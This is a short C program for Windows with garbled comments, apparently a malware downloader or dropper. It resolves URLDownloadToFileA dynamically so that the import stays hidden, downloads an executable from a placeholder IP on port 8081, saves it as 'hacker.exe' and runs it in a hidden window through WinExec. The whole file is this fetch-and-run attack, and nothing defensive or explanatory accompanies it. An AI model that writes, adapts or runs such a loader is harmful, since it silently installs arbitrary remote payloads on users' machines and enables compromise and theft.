#include<UrlMon.h>
#include<Windows.h>
typedef int (WINAPI* MY_DOWNLOAD_PROC)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);

// һ������ִ����
int main()
{
	
	HMODULE hurlmod = LoadLibrary(L"urlmon.dll");
	
	MY_DOWNLOAD_PROC function_ptr = (MY_DOWNLOAD_PROC)GetProcAddress(hurlmod, "URLDownloadToFileA");

//���������ϱ�����IP��ַ
	function_ptr(NULL, "http://xx.xxx.x.xxx:8081/ov.exe", "hacker.exe", 0, NULL);

	//URLDownloadToFile(NULL, "http:// /ov.exe", "a.exe", 0, NULL);
	WinExec("hacker.exe", SW_HIDE);
}